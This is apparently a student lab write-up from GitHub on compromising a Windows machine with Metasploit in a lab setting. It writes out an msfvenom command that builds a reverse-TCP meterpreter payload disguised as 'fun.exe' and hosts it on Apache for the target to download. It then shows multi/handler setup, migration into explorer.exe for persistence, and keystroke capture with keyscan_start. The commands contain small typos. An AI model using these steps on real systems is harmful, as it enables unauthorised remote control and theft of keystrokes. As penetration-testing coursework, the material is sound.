# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
### ifconfig
192.168.91.247

![17468544633778439692885706617609](https://github.com/user-attachments/assets/eed51366-2711-4539-a1b6-e84c911ba491)


Find the attackers ip address using ifconfig

### msfvenom

![17468545029193622224694326026560](https://github.com/user-attachments/assets/d3ba4074-445e-4181-992d-b5d6fb3a4178)


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

### copy the fun.exe into apache/var/www/html/

![1746854524809634127741657855545](https://github.com/user-attachments/assets/e3c3c30e-0a73-4f8f-9b30-2a5a049ea2be)


copy fun.exe
start apache server
sudosystemctl apache2 start
check the status of apache2

### msfconsole

![17468545420401873368445533289212](https://github.com/user-attachments/assets/4aa034a1-9220-4ee4-bd4b-7a84f0fff900)


invoke msfconsole
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

### Multihander,setpayload,exploit



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Parrot machine:
http://192.168.91.247/

![17468545572841655893755062720176](https://github.com/user-attachments/assets/d5cc1ee8-4991-4f78-b37e-445d87e3ab39)


![17468545773186415034559621583518](https://github.com/user-attachments/assets/4790842e-d3e0-481c-902a-36ee7f1043d9)



![1746854588685630260214076310162](https://github.com/user-attachments/assets/76a4dcd3-544a-43ce-be8e-0ca1c35e66f6)

![17468546161766325289882751084416](https://github.com/user-attachments/assets/976bd098-e3ee-435b-9b89-e5b7307a348a)


![17468546311341758663156684109226](https://github.com/user-attachments/assets/0db8e2db-0d29-4a72-ba96-06adad6570ff)


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![1746854648504609838641062503486](https://github.com/user-attachments/assets/4816d838-e1a1-43c6-904c-ea7a41e7950e)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![17468546680886740929719731315765](https://github.com/user-attachments/assets/4dab1bc8-6a3d-4c1f-8700-c97f4e8660ef)


### Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![17468546831583262470180280955869](https://github.com/user-attachments/assets/b63ebd37-57ae-4da7-b41c-1c1803945d6e)


![17468546961531773327238299030184](https://github.com/user-attachments/assets/a7a57d49-3778-4265-9baa-02af78f92377)


![17468547275534765771785791938073](https://github.com/user-attachments/assets/b6278b2f-0392-4872-a2ae-08b386e672c0)




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
